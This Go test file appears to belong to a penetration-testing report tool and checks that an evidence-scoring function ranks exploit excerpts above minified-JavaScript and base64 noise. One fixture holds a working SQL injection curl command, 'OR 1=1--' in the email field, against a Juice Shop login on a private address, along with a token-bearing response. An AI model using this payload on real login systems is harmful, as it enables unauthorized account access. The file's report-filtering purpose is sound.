package providers

import (
	"strings"
	"testing"
)

func TestEvidenceScore_RanksExploitAboveNoise(t *testing.T) {
	// The exact noise that polluted flow 100013's report: a minified Angular bundle.
	jsBundle := "3201:`]})}return t})();var fo=(()=>{class t{http=m(ue);hostServer=J.hostServer;" +
		strings.Repeat("function(){return e})();var x=(()=>{class y{}", 200)
	// A real exploit excerpt: SQLi on login with the proof in the response.
	exploit := "$ curl -s 'http://10.88.0.37:3000/rest/user/login' -d '{\"email\":\"admin@juice-sh.op'\\'' OR 1=1--\",\"password\":\"x\"}'\n" +
		"HTTP/1.1 200 OK\n{\"authentication\":{\"token\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMi\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
	base64Blob := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5", 50)

	sExploit := evidenceScore(exploit)
	sJS := evidenceScore(jsBundle)
	sB64 := evidenceScore(base64Blob)

	t.Logf("exploit=%d  jsBundle=%d  base64=%d", sExploit, sJS, sB64)
	if sExploit <= 0 {
		t.Errorf("exploit excerpt should score > 0, got %d", sExploit)
	}
	if sExploit <= sJS {
		t.Errorf("exploit (%d) must outrank JS bundle noise (%d)", sExploit, sJS)
	}
	if sJS > 0 || sB64 > 0 {
		t.Errorf("noise should score <= 0 (js=%d b64=%d)", sJS, sB64)
	}
}

func TestEvidenceWindow_CentersOnSignal(t *testing.T) {
	pre := strings.Repeat("boring preamble line\n", 400)
	post := strings.Repeat("trailing noise\n", 400)
	text := pre + "POST /rest/user/login HTTP/1.1 -> 200 OK token=eyJhbGciOiJIUzI1NiJ9 PROOF\n" + post

	win := evidenceWindow(text, 300)
	if !strings.Contains(win, "PROOF") {
		t.Errorf("window must include the exploit signal region; got: %q", win)
	}
	if len([]rune(win)) > 305 {
		t.Errorf("window too long: %d runes", len([]rune(win)))
	}
}
